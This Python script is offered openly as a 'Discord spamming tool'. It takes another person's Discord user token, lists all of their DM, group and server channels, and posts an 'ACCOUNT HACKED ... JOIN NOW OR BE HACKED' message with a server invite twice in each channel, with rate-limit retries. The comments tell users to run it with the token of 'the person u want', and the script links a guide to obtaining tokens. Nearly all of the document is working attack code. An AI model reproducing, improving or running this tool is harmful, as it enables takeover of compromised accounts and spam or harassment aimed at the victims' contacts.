#Sup skids, all u need to do is change spam message n run it with the user token of the person u want.
#Made with love by SkidCore aka Mr. T.R.U.E. cuz im the only one who made ts cuh
#Join our servers cuh https://discord.gg/7x2AMfQjKx https://discord.gg/AzQXubrPRD
import requests
import json
import time

BASE_URL = "https://discord.com/api/v9"

PURPLE = "\033[95m"
RESET = "\033[0m"

def skidcore():
    print(PURPLE + r"""
  ______   __    __    __    _______    ______    ______   _______    ______
 /      \ |  \  /  \ _/  \  |       \  /      \  /      \ |       \  /      \
|  $$$$$$\| $$ /  $$|   $$  | $$$$$$$\|  $$$$$$\|  $$$$$$\| $$$$$$$\|  $$$$$$\
| $$___\$$| $$/  $$  \$$$$  | $$  | $$| $$   \$$| $$  | $$| $$__| $$ \$$__| $$
 \$$    \ | $$  $$    | $$  | $$  | $$| $$      | $$  | $$| $$    $$  |     $$
 _\$$$$$$\| $$$$$\    | $$  | $$  | $$| $$   __ | $$  | $$| $$$$$$$\ __\$$$$$\
|  \__| $$| $$ \$$\  _| $$_ | $$__/ $$| $$__/  \| $$__/ $$| $$  | $$|  \__| $$
 \$$    $$| $$  \$$\|   $$ \| $$    $$ \$$    $$ \$$    $$| $$  | $$ \$$    $$
  \$$$$$$  \$$   \$$ \$$$$$$ \$$$$$$$   \$$$$$$   \$$$$$$  \$$   \$$  \$$$$$$
""" + RESET)

skidcore()
print ("Made with love by Mr. T.R.U.E. and Jeffrey Epstein.\n ")
print ("Join SkidCore server cuh https://discord.gg/7x2AMfQjKx")
print ("You can learn how to get a user token here: https://gist.github.com/MarvNC/e601f3603df22f36ebd3102c501116c6\n")
print ("Ok anyways im not responsible of what you do with this tool cuh so have fun:\n ")
TOKEN = input("Enter Discord user token: ")
SPAM_MESSAGE = "@everyone @here ACCOUNT HACKED BY THE NEVERTRUST PROJECT, JOIN NOW OR BE HACKED LIKE THEM https://discord.gg/AzQXubrPRD"

headers = {
    "Authorization": f"{TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
}

def get_all_channels():
    """Get all channels"""
    all_channels = []
    
    try:
        response = requests.get(f"{BASE_URL}/users/@me/channels", headers=headers)
        if response.status_code == 200:
            dm_channels = response.json()
            for channel in dm_channels:
                if channel.get('type') in [1, 3]:
                    all_channels.append(channel)
    except Exception as e:
        print(f"Error getting DM channels: {e}")
    
    try:
        response = requests.get(f"{BASE_URL}/users/@me/guilds", headers=headers)
        if response.status_code == 200:
            servers = response.json()
            print(f"Found {len(servers)} servers")
            
            for server in servers:
                try:
                    server_id = server['id']
                    channel_response = requests.get(
                        f"{BASE_URL}/guilds/{server_id}/channels", 
                        headers=headers
                    )
                    
                    if channel_response.status_code == 200:
                        channels = channel_response.json()
                        for channel in channels:
                            if channel.get('type') in [0, 5]:
                                all_channels.append(channel)
                except Exception as e:
                    pass
    except Exception as e:
        print(f"Error getting servers: {e}")
    
    return all_channels

def send_message(channel_id, message):
    """Message sending with rate limit handling cuh"""
    try:
        message_data = {"content": message}
        response = requests.post(
            f"{BASE_URL}/channels/{channel_id}/messages", 
            headers=headers, 
            json=message_data
        )
        
        if response.status_code == 200:
            return True, None
        elif response.status_code == 429:
            retry_after = float(response.json().get('retry_after', 1))
            return False, retry_after
        else:
            return False, f"HTTP {response.status_code}: {response.text}"
    except Exception as e:
        return False, str(e)

def spam_channels():
    """Spam all channels"""
    print("Fetching all channels...")
    channels = get_all_channels()
    
    if not channels:
        print("No channels found!")
        return
    
    print(f"Found {len(channels)} channels to spam")
    print(f"Sending 2 messages to each channel...\n")
    
    total_successful = 0
    total_failed = 0
    
    for i, channel in enumerate(channels):
        channel_name = channel.get('name', f'Channel {channel["id"]}')
        channel_type = "DM" if channel.get('type') == 1 else "Group" if channel.get('type') == 3 else "Server Channel"
        
        print(f"({i+1}/{len(channels)}) Spamming {channel_type}: {channel_name}")
        
        for msg_num in range(1, 3):
            print(f"  Sending message {msg_num}/2...")
            
            success, error = send_message(channel['id'], SPAM_MESSAGE)
            
            if success:
                total_successful += 1
                print(f"    ✓ Sent successfully")
            elif error and isinstance(error, float):
                print(f"    ⏳ Rate limited, waiting {error} seconds...")
                time.sleep(error) 
                success, _ = send_message(channel['id'], SPAM_MESSAGE)
                if success:
                    total_successful += 1
                    print(f"    ✓ Sent successfully after retry")
                else:
                    total_failed += 1
                    print(f"    ✗ Failed after retry")
            else:
                total_failed += 1
                print(f"    ✗ Failed: {error}")
            
            if msg_num < 2:
                time.sleep(1)
    
    print(f"\n✓ Spamming complete!")
    print(f"  Total successful: {total_successful}")
    print(f"  Failed: {total_failed}")
    print(f"  Total messages attempted: {len(channels) * 2}")

def main():
    print("=" * 60)
    print("DISCORD SPAMMING TOOL")
    print("=" * 60)
    print()
    print("Spamming channels...")
    print("-" * 40)
    spam_channels()
    print()
    print("=" * 60)
    print("DONE!")
    print("=" * 60)

if __name__ == "__main__":
    main()